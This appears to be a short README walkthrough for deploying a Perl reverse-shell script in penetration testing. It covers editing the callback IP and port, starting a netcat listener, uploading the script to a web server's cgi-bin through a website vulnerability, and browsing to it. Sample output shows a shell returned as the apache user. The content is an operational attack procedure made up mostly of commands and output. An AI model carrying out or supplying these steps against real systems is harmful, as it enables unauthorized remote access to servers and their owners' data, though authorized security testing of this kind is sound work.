# Walk Through
Modify the source

To prevent some else from abusing your backdoor – a nightmare scenario while pentesting – you need to modify the source code to indicate where you want the reverse shell thrown back to.  Edit the following lines of perl-reverse-shell.pl:
```
# Where to send the reverse shell.  Change these.

my $ip = '127.0.0.1';

my $port = 1234;
```


Get Ready to catch the reverse shell

Start a TCP listener on a host and port that will be accessible by the web server.  Use the same port here as you specified in the script (1234 in this example):
```bash
nc -v -n -l -p 1234
```

Upload and Run the script

Using whatever vulnerability you’ve discovered in the website, upload perl-reverse-shell.pl.  You’ll need to place it in a directory where PERL scripts can be run from (e.g. cgi-bin).  Run the script simply by browsing to the newly uploaded file in your web browser:

http://somesite/cgi-bin/perl-reverse-shell.pl

Enjoy your new shell

If all went well, the web server should have thrown back a shell to your netcat listener.  Some useful commans such as w, uname -a, id and pwd are run automatically for you:
```bash
$ nc -v -n -l -p 1234
listening on [any] 1234 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 58034
 16:35:52 up 39 days, 19:30,  2 users,  load average: 0.22, 0.20, 0.14
USER     TTY        LOGIN@   IDLE   JCPU   PCPU WHAT
root   :0        19May07 ?xdm?   5:07m  0.01s /bin/sh /usr/kde/3.5/bin/startk
Linux somehost 2.6.19-gentoo-r5 #1 SMP PREEMPT Sun Apr 1 16:49:38 BST 2007 x86_64 AMD Athlon(tm) 64 X2 Dual Core Processor 4200+ AuthenticAMD GNU/Linux
uid=81(apache) gid=81(apache) groups=81(apache)
/
apache@somehost / $
```
